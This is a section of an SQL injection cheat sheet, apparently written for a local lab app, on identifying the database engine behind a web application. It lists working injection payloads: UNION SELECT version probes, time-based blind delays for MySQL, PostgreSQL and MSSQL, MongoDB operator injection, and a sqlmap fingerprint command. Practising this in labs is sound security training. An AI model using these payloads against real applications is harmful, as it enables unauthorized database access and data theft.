 A1. DATABASE FINGERPRINTING  —  which database is it? (MySQL /
     Postgres / SQLite / MSSQL / Mongo). Find out BEFORE the schema.
==================================================================

# 1) trigger an error -> the message often names / hints the engine
zzz'
#   this app returns:  unrecognized token: "'"      (a SQLite-style error)

# 2) inject a DB-specific version function -> the one that WORKS is your DB
zzz%' UNION SELECT sqlite_version(),NULL,NULL,NULL,NULL--
#   -> returns 3.42.0   => it is SQLite

# same slot, other engines (these ERROR here, which also confirms "not them"):
#   ... UNION SELECT version(),NULL,NULL,NULL,NULL--        -> MySQL / PostgreSQL
#   ... UNION SELECT @@version,NULL,NULL,NULL,NULL--         -> MySQL / MSSQL
#   ... UNION SELECT banner,NULL,... FROM v$version--        -> Oracle
#   (on this app, version() -> "no such function: version"  => not MySQL/PG)

# time-based (blind) fingerprint -> which delay works tells the engine:
#   SLEEP(5)                -> MySQL
#   pg_sleep(5)             -> PostgreSQL
#   WAITFOR DELAY '0:0:5'   -> MSSQL
#   (SQLite has no sleep function)

# NoSQL (MongoDB etc.): SQL payloads do NOTHING. Test operators instead:
#   username[$ne]=1     or JSON  {"$ne": null}   -> if it reacts, it is NoSQL

# tech-stack clues (no injection needed):
#   HTTP headers: X-Powered-By (PHP->MySQL, Express->Node/Mongo, ASP.NET->MSSQL)
#   cookies:      PHPSESSID / connect.sid / JSESSIONID
#   nmap ports:   3306 MySQL | 5432 Postgres | 27017 Mongo | 1433 MSSQL | 1521 Oracle

# automated: let sqlmap fingerprint it for you
#   sqlmap -u "http://127.0.0.1:5000/api/search?q=x" --fingerprint
